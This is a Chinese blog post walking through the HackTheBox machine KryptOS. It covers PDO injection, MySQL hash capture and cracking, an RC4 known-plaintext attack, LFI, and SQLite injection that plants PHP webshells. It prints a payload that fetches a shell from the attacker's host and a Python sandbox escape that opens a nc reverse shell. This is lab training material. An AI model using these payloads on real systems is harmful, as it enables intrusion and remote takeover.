> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fo9evwtD_9ZSDBU-PeaqKg)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **152** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/c6lNmDMELgVefhqyswkhNcG53sbopmNFb6w6BGUZCXq83PjE80maj43XT7BjARoN3xKWuFdAc2IBPs0urI5ktA/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/183

靶机难度：疯狂（5.0/10）

靶机发布日期：2019 年 5 月 27 日

靶机描述：

KryptOS is an insane difficulty Linux box which requires knowledge of how cryptographic algorithms work. A login page is found to be vulnerable to PDO injection, and can be hijacked to gain access to the encrypting page. The page uses RC4 to encrypt files, which can be subjected to a known plaintext attack. This can be used to abuse a SQL injection in an internal web application to dump code into a file, and execute it to gain a shell. A Vimcrypt file is found, which uses a broken algorithm and can be decrypted. A vulnerable python app running on the local host is found using a weak RNG (Random Number Generator) which can be brute forced to gain RCE via the eval function.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

  

![](https://mmbiz.qpic.cn/mmbiz_png/xMTwOwcXNfzGaphWRyvoDsqKZMNRzWyK9jZgBFCFiaUicsfjRIcJujZSqLEibyYfNiarNYWErKxru7g4kVOh5fIC9g/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmSYwDibGoa7h3MV7dhKowFzTOO5GuqDiaBboYOjVbgnseLddicqSCPtzqg/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.129...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmf17RI7L9HVRuiauyNnxyujwbkIQyJ1W0onibSQXVQvgsIJyDpXVOvI9g/640?wx_fmt=png)

仅仅开放了 ssh 和 http 服务...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmATmlSxMtVjpQomEft4vFIMawruEdUh0BBv87cQccGs8Qf31cdHpBWA/640?wx_fmt=png)

访问 http 是个登陆页面..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmI5JTw3YMPKVRM7wst5agd6VoZMFuhMLJKvx81hicvxA3rQQJHTtjzcA/640?wx_fmt=png)

查看源代码发现每次刷新，valu 令牌值都会更新...burpsuit 拦截看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmdILaMDqQb6rkDpJyR93pGIusjXaV4hPSMiaHEevM8M0wSOYQFHDKn4w/640?wx_fmt=png)

通过几分钟测试，简单的发现了此处存在注入利用.... 报错是 1044...google 看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmdEZeSEaSfemR9eMI4qHUETAvecYfcfpzLM3J6TTjaibYt6Q15mS33yw/640?wx_fmt=png)

```
https://stackoverflow.com/questions/744656/possible-pdoexception-errors-mysql-5
```

此处没用提到 1044，但是提供了一个 errors 的服务器错误列表参考链接... 进去看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylm0p4XPPBGI6gzjgrsYo48IDfGUGYflzOL7vHUhKbKOTqHfeaXq3zhzA/640?wx_fmt=png)

果然这是总报错列表，1044 给出的解释是拒绝访问数据库...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmM9R7H3czIVGEzPF9yqpgKrCgYS6PPq0lYBkfMINVVggJ0YfIPia1L3A/640?wx_fmt=png)

```
https://www.php.net/manual/en/pdo.connections.php
```

根据 PDOException 报错，我找到了此篇文章，给出了一些思路...host...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmEwJ7rhCx6Inp10wqHKRseWC4lTf4AOu46aRyZVD8q4cprA0zOaxHfQ/640?wx_fmt=png)

尝试添加 host:IP 后，是可以建立联系的... 对应的是 3306 端口..mysql

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmicNHRxvjDRiaRLJ1N99Kw0Z2FF2sPfq2icAKO9QJqMfloA4niaqS4ZQotA/640?wx_fmt=png)

利用 MSF 抓取数据流量中存在的 mysql 的 hash 值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmUmy7n0uH86P9M6Sdw13iaXxxj0kYRgFCokBqIDPCia0FcekHMbpVdaAQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmVfthZ8nzUUia1smWCtLCVESOHw9BqStHSWUCpMZfrniauY7M72dicYiczg/640?wx_fmt=png)

PDOException code: 1045 这是访问被拒绝的意思...

User: dbuser; Challenge: 112233445566778899aabbccddeeff1122334455; Response: 73def07da6fba5dcc1b19c918dbd998e0d1f3f9d; 获得了 mysql 中的哈希值..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmp2WrNueYic2mDNvOanLGx7I50PpQZImFMajAIP9FIjJDjw3o0uDTsww/640?wx_fmt=png)

```
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
john --wordlist=~/桌面/rockyou.txt mysql_hash
```

通过 john 爆破获得了密码... 尝试 ssh 不能登陆... 继续枚举

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylm0uhmIs1FVVXniayLBiaK5ZEicvLfCAED992a8rIbvXqKgXHBTrkU4tHfw/640?wx_fmt=png)

为了能在本地抓取 mysql 的流量情况，本地开启了 MariaDB 服务器...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmg39ra5J8UXEy842TlJHWgZLmezZK7vfATbTupeNibesR6qB8ZGYY0zg/640?wx_fmt=png)

```
mysql -u root
create database cryptor;
grant all privileges on *.* to 'dbuser'@'%' identified by 'krypt0n1te';
```

并在本地 mysql 中创建了前面 MSF 获得了用户名密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmrqVvtNNSja4XOy6yJW4X63nBMej7TEn5JqqKuL9xWiadRIY0ibZFZZkA/640?wx_fmt=png)

添加完后访问，PDOE 错误变成了 2002，有效...

PDOException code: 2002

意思是不能连接到我的 mysql 数据库服务器.... 那么我们要利用 socat 建立两个 mysql 之间双向数据传输通道... 开始

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmXsFNLzJKicGxgkdzCQLiaxu0Mh4NvNHvRiczCUlibvnuiaju4geVtOFichrA/640?wx_fmt=png)

```
socat TCP-LISTEN:3306,bind=10.10.14.51,fork TCP:127.0.0.1:3306
```

通过 socat 重定向 TCP 端口，更改主机侦听...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmC2dY0bHKo0FDOib4TMibAtHB9UrhgFIFZZ4UydV7PMPLGic1IoSWib0JAw/640?wx_fmt=png)

继续更新令牌值访问后，200 返回，已经能正常访问了，下一步做 TCP 转储... 抓包分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmdwPtJuDnvcFhOQlPmSaibef6OKibzTbCKFonjdILM3b1osRQAsib4ibYnQ/640?wx_fmt=png)

记得更新令牌值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylm7iadTRXCqX3AAib395Yu8KgA7ElgPwBNWVXxREQmbUmtsjTC1aQXzR6g/640?wx_fmt=png)

```
tcpdump -i tun0 -w cap.pcap
```

利用 tcpdump 保存流量数据包... 这里利用 tcpdump 是因为后期复习有一份数据罢了.. 本来可以直接 wireshark 查看的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmevUFScN0nL2Y0ncjCUESohdYlD8fnOqvDM2sn7bMooGDce0I0ayic6Q/640?wx_fmt=png)

更新好的令牌值，输入即可...tcpdump 会抓取数据包...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmmWetSY7iaa7drXMSaCfjJ5a8RaibjiaDY7lxEJQib0OHDQkVUtcxMRx6AQ/640?wx_fmt=png)

利用 wireshark 查看 tcpdump 抓取的数据包，在 tcp 流中发现了 admin 用户名和 hash 密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmCCR84GHbX8E0xxdvLPgwM0Qf0g4f8mBBbKFVueHibhibt5EeNCCAED5g/640?wx_fmt=png)

这是 32 位的 hash 值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmwPEmcWEC9kx42wqlLEr8zicfJ80y0KeWSbCmXPxJ8wy6aFuib51O2Ybg/640?wx_fmt=png)

```
use cryptor;
create table users ( username varchar(32), password varchar(32) );
insert into users ( username, password ) values ( 'admin', '21232f297a57a5a743894a0e4a801fc3' );
```

根据前面的思路，继续在 mysql 本地中创建 32 位的密码和 admin 用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmH8yTNXthVa43bPrD4pxWkGrw156hAHpNzdDDogQzfeKmERXu7V3tXQ/640?wx_fmt=png)

当继续更新令牌值访问后，返回 HTTP/1.1 302 Found.... 说明成功利用本地的数据流以及创建的用户名和 hash 密码... 成功登陆了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylm7B3dxWK0H7xYNqA0cAjibZpAVNiatHwn8ONG6eyhQ81dvxMiazSaPWFyA/640?wx_fmt=png)

在 send 刷新一次...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmZkwxbBibBK8wviacMmBYZhdLSTRt1YYP8vjbxbyDicnsOQrTllqvCrFhg/640?wx_fmt=png)

可看到被重定向到 encrypt.php 页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmjnABpdkcfPPATtSVN8jOSjm0quwUGRrud5t0SEbozf5c4Pia14FXR1A/640?wx_fmt=png)

这里需要了解 AES-CBC 和 RC4 的加密算法原理....

可看到可选择 AES-CBC 和 RC4，其中 RC4 是 Xor 算法：

明文 XOR 密文将为我们提供密钥。

纯文本 XOR 密钥将给我们提供密文。

密文 XOR 将给我们提供纯文本。

测试下，假设使用静态密钥来执行 RC4 是否会和原理一致....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmZbsPV8d937g7ia2stTJLFSVyAAMKeLSwkbxdHRrBbKWVdP7Mib9geYsQ/640?wx_fmt=png)

假设它使用静态密钥来执行 RC4，为了测试，我创建了 dayu 文件，内容是 hello....

然后开启 http，通过上传，RC4 值是 MFuD8FVg...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmRj91HOMvLCn2BhOPPpzlXm7zGPiaoAibzDvxAIiclp8sDuiadibGbg9qOiaw/640?wx_fmt=png)

然后我将 MFuD8FVg 值继续 base64 转储到文件 dayu1 中，查看是一些乱码...

继续上传，RC4 输出值是 aGVsbG8K，通过 base64 转储，回到了 hello 信息...

看完测试应该很好理解 RC4 的 XOR 加密的工作原理了吧...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmN55U7IYYx5PJQSNYXMjQwFy81D4zJvbvFB6ELSyBmok2UnLzalDJIQ/640?wx_fmt=png)

通过爆破，发现了 / dev 目录信息...（只有这个有方向，在 css 目录中的文件是个坑）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylm4rheO50qOby8uibzibPtGHRWcgHuJJ0yaL6oicUy8yvSNtnd6yMWDobzA/640?wx_fmt=png)

这里我访问了 10.10.10.129/dev，发现获取的值是 403，和正常一样...

由于前面 socat 开启了通道，我尝试了本地查看... 枚举

在 http://127.0.0.1/index.php 获得了有用信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmicriaL9BicN4twvGWEY1MtBT6dTEwO9WPObOWMCegruLRWzDuRmBZqfxg/640?wx_fmt=png)

通过 XOR 密文原理，前面也演示过了... 就不多说了...

获得了 base64 值...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmnBsc3emia3IC8nVsiaSo2Tg0dfywjhGmYb4DaAsrNx5JJUqJV2B1cEmg/640?wx_fmt=png)

输出可看到：

还有 2 个其他链接... 存在参数 view 用于查看其他页面，view 的存在可能是本地文件包含漏洞 LFI....???

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmzkzEm4uLu0DQZJ6KqcfqV2lPlXcsn99o9zQwa80PhEEegwbDv2iaibBg/640?wx_fmt=png)

这是 `http://127.0.0.1/dev/index.php?view=todo` 的输出内容... 这里就省略了前面一些步骤了...

根据注释，将尝试获取 sqlite_test_page.php...（这是尝试自行文本编辑）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmg22nmprusDUMx4pcwAa49ZkQtjD5vwgs5QhNFicZw2Y5J5R0tYM4FBw/640?wx_fmt=png)

这是 `http://127.0.0.1/dev/sqlite_test_page.php` 的输出内容...

内容可能是隐藏了的或只是空白，猜测它是隐藏的，可以使用 PHP 过滤器或包装器将内容编码为 base64... 试试

如何过滤可参考：

```
https://highon.coffee/blog/lfi-cheat-sheet/#php-wrapper-phpfilter
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmKmia215wrsa56lWSgyL6o5rFiaAxgCDYPJcjXqoPibzGibibxIHnxIgJ1Fg/640?wx_fmt=png)

这是 `http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page` 的输出...

可看到在文件底部存在 base64 编码... 果然隐藏了内容

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmibibia7LhO5hNF1jIpb4GTiaxAHs8t8zFvF7eMO3mJTQNBz6P1pib9e0MFw/640?wx_fmt=png)

通过 base64 继续查看，这段代码中两个红框内容很重要...

第一个红框意识是：我可以控制在输入中构建一个 SQL 查询等命令，意味着存在注入...

第二个红框显示了该随机命名的文件夹是可全局写入的（之前在 todo 列表中也已引用过了 / sqlite_test_page.php）... 所以我也可以通过加密页面访问该目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmrjWIHKQaOjK6Ms4zFC7ibzFqibd2t2XaH2ichl5B40JRyx0wVZ0MiblsHQ/640?wx_fmt=png)

继续测试，这是 `http://127.0.0.1/dev/sqlite_test_page.php?bookid=1` 输出内容...

通过继续测试了 id1~3 修改 url，获得的输出内容分析得到结果...

请求数据库时，通过 http 请求它们时，确实会显示数据库中的字符串，这样我可以创建一个带有 php 扩展名的新数据库，并在其中包含一个 webshell，然后通过 Web 服务器访问它，则可以运行 php... 提权

先测试下写入个简单得字段，然后创建. php 文件看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmJBBFbOQW7IgOOAsxg0oD7oUd7icWg95Hf7bB0NpEXO40VqVk045qIsQ/640?wx_fmt=png)

```
1; ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/df.php' as df; CREATE TABLE df.df (stuff text); INSERT INTO df.df (stuff) VALUES ("<?php echo 'system: '; system('id'); echo '\nexec: ' . exec('id') . '\nshell_exec: '; shell_exec('id'); echo '\npassthru: '; passthru('id'); echo '\nscandir: '; print_r(scandir('/home')); echo '\nfile_get_contents: ' . file_get_contents('/etc/lsb-release'); ?>");--
```

创建 df.php 脚本，内容集成了很多查询和读取信息的命令... 记得进行 url 编码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmSFg13DToEQt2TPDsay8vSHl0mY1Zp0eA3urIWHicqmkzPAvrLMm1VEQ/640?wx_fmt=png)

可看到输出值是成功的... 查看下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmE1ibbJNbY9XaVUaKTPz4pMyHpaNHXhHkd7kPJ3SwJNG6qHAubT6Q4vA/640?wx_fmt=png)

可以看到执行尝试发部分命令是未成功，但是可以读取文件和列出目录... 非常好

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmIvgncQ8WD3UOy7Jl48YahanJdR8Tu9O31Tv73DoKVT1a2KTQ3vavQA/640?wx_fmt=png)

```
1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/dayu.php' AS rick;CREATE TABLE rick.pwn (dataz text);INSERT INTO rick.pwn (dataz) VALUES ('<?php print_r(scandir("$_GET[dir]")); print_r(file_get_contents("$_GET[file]")); ?>');
```

修改下，只查看和读取...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylm2libfVYC3MWLJgau7k6FRRe3UBXOnozVVkoF3pUdaLB39c3SUJpJqUw/640?wx_fmt=png)

成功创建注入简单的 dir 查询命令... 开始

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylm5VRClGUl67RZicgliapQXSvGYscmnNfAEBIg8nX2NlfObTlkGXXLm1ww/640?wx_fmt=png)

```
http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dayu.php?dir=./
```

查看到了底层目录的文件内容... 开始枚举...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmNrCUOKiadMJQNpcf4PvniaNG2YHch3cBVGCBhB6OEia21YwlKvvC9nzPQ/640?wx_fmt=png)

```
http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dayu.php?dir=/home/rijndael
```

可以看到 user_flag 信息，还有 creds.old 和 creds.txt 文本信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmcib1ZtYknBEiaBw4VgUL4BzVeY6vdkUvicC6Nlk172IDKAJWGSclZvKYg/640?wx_fmt=png)

```
http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dayu.php?file=/home/rijndael/creds.old
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmKRg1EiaWYVjtRQcWgCoSKvkXEufMib3kpNQ8BOSN5JR272mg89qZDFlg/640?wx_fmt=png)

```
http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dayu.php?file=/home/rijndael/creds.txt
```

这里我发现获取到的数值不对，还有后续的乱码没编译出来... 能力有限，这里太浪费时间了，太浪费时间...  

我通过大量的时间搜索，找到了该方面的 shell....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmYogoNeRUkuiarh24iac141OMIIQpOCp29ZdPwKXwgEcfibicksuj5A4Dmg/640?wx_fmt=png)

```
git clone https://github.com/TarlogicSecurity/Chankro.git
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylm2rPqLp63yCQ4GZu4mAz4DYqHKYqVmD8gAQgW6JUz5vLMNbaVvicXwoQ/640?wx_fmt=png)

编辑简单的 shell... 测试 shell 正常没问题

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmhZestesgsokjTicv79SaUt2FlsBM6qsemDQ90JUlYQDEY4BX5hOgs8g/640?wx_fmt=png)

```
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html/dev/d9e28afcf0b274a5e0542abb67db0784
```

根据 chankro 提示，创建好了 chan.php 的 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmyzB7C37rspQk472zOMB5VfdB2rWZ9KrAomEcVhplw2obrlLlibNoTeg/640?wx_fmt=png)

```
1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/dayu1.php' AS lol;CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ('<?php file_put_contents("rce.php",file_get_contents("http://10.10.14.51:8000/chan.php"))?>');
```

通过创建 dayu1.php 激活执行上传 chan.php 文件，然后在内置了 rce.php 文件用于执行 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmvUVBbHs2qTFAgY6d7RyOYHzLWVrJ1RZD60WPaPA45AQHc19dicsohNg/640?wx_fmt=png)

成功上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmic5QVpu9Fb1pntlVjMJFPBFrlwjPbSOW6xniaodn1k9rVZ6crNwW6etQ/640?wx_fmt=png)

```
http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/rce.php
```

获得了外壳 www 低权用户... 这样方便枚举了

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylm33WnJsY96efl1fal7vB24icew8WzKf9mhpnnwV0qT842yrmTXKw1DcQ/640?wx_fmt=png)

可看到 user_flag 无法读取...

读取 creds.txt 时，这是 VimCrypt~02!...google 看看这是啥... 后面还有一些乱码

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmGPmN5bauFQVTyTqYZQYBIGcxeUVN8BTyFrLK6icOzOnUf7fDbqAuaSg/640?wx_fmt=png)

google 发现了一些文章，还有利用的 exp...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylm5rYGSRxDNQsB3DrickISV8x9E0iaXVcQbictKaibAaVvft8J0Hw2Eh4M2A/640?wx_fmt=png)

这里解释到这是 VIM 的加密文本文件... 需要解密...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmqm9b4zXQwF81Zu8jgUraibx5J6rwI07KfFhic06eOVW0ZGQKiaBiaDhDUA/640?wx_fmt=png)

简单修改了下脚本... 破解了密码... 到这一步才获得 user... 的 flag.... 吐了太难了

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmO6EIsicU8tB6Dlx0IMquVRhSBwdYy45ibtPzPLU6f0YkGbm0zhPRCwEA/640?wx_fmt=png)

ssh 登录，获得了 user_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmePPRlMFluJFliavribsicmrDB1vlDSJ1AEMKicYHaVzlbLiaqbTU5ssL8kA/640?wx_fmt=png)

枚举发现该用户下存在 kry... 文件夹...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmxYlI7lJxUpLOPpMxPf7JTGkI3DWMtNia9h7IgnI0X0S7KG4Gq4wyNqw/640?wx_fmt=png)

查看 kryptos.py 代码，这是一个 localhost 在端口 81 上运行的服务器，可以看到通过向 / eval 发送请求，参数 expr 得到了评估后并执行从而有一个内置的控件，但是该参数 sig 必须是有效的签名，并且所有内置函数均被禁用...

意思就是它仅评估带符号的表达式，就算可以绕过该保护，也无法执行有用的操作，因为 builtins 被禁用了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmNYHkRqzicrYgvhlSSZnfahRRnstfVQ5PzxJ1YEiaFIO4Gy9HrH0fjzsw/640?wx_fmt=png)

认证了本地是开放了 81 端口的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmoElvFtAnDjTFGEZJ5vZKo1FgpibuWyl2ibVr1M4SX6obwThKojWKWRTg/640?wx_fmt=png)

```
ssh -L 81:localhost:81 rijndael@10.10.10.129
```

为了方便执行，我将流量转发到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmEjhx5xa7wUICWpDxDSWFxQCickSCW7QLFvTu7BcuicAlFicZpFYW5RaNw/640?wx_fmt=png)

在反复测试中，发现样本大小为 500 会产生足够的签名键冲突，最终将创建一个有效的签名来欺骗服务器...

知道了大小，最后需要绕过 `eval(expr, {'__builtins__':None})`...

通过 google 搜索可不 python 等内容...

Python 中的所有内容都是一个对象，只要有权访问对象类，就可以使用 Python 在当前作用域中的内部函数和属性进行检索 `__builtins__`，即使将其设置为 None 也可以...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOibVXNPvvBuaWJN5y4DFylmcVDvgBAVTI892YcbVpjsD2SQ9UZ1wDRhSNMAOC4yFTfrNcGu0HvhIQ/640?wx_fmt=png)

```
python3 exploit.py 500 "{}.__class__.__mro__[1].__subclasses__()[121].__init__.__globals__['__builtins__']['__import__']('os').system('rm -f /tmp/p; mknod /tmp/p p; /bin/bash </tmp/p | nc 10.10.14.51 1234 >/tmp/p')"
```

利用端口转发，然后通过了解 python 等原理后，利用以上代码获得了反向外壳 root 权限...

![](https://mmbiz.qpic.cn/mmbiz_png/x2A34tB6DJ1OkPcdribDzibshJwyiacGV0dL6xyJSMoUODic9LUULgNOnWiciaLpD2A7HtR7e6GqhqAkw8zXBObGceYA/640?wx_fmt=png)

获得了 root_flag 信息... 这是近一个月最累的一台靶机.... 快吐了...

这台靶机真的算盲区知识... 坚持了 3~4 个晚上的时间，终于完成了...

学到了很多很多...

sql 注入 -- 数据库 Error 信息熟悉 --MSF-mysql 数据流抓取 --john 爆破 -- 熟悉 mysql 创建信息 --socat 通道开启 --tcpdump 抓包 --wireshark 分析流量包 -- 需熟悉 AES-CBC 和 RC4 密码原理 -- 页面枚举获得进一步信息 --LFI 漏洞与 view 利用 --SQLite3 SQL 脚本熟悉 --PHP 过滤器熟悉获得隐藏 base64 值 -- 创建脚本枚举 php-- 利用 Chankro 生成反弹 shell-- 利用 VIM 的 EXP 爆破 creds 文本获得 ssh 密码 -- 深入熟悉 python 对象原理 -- 利用 SSH 端口转发 -- 利用 python 枚举正确数值和绕过 builitin 限制最终获得反弹 shell...

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台疯狂的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/Rhl7Fe1Ew2icdiaxAoicRDTOcic6uZqjKNRuQTmL2KnOQaSBwas6DeYNdq479WEFto9n2bssQXlvVic2bGGlQghxWVg/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)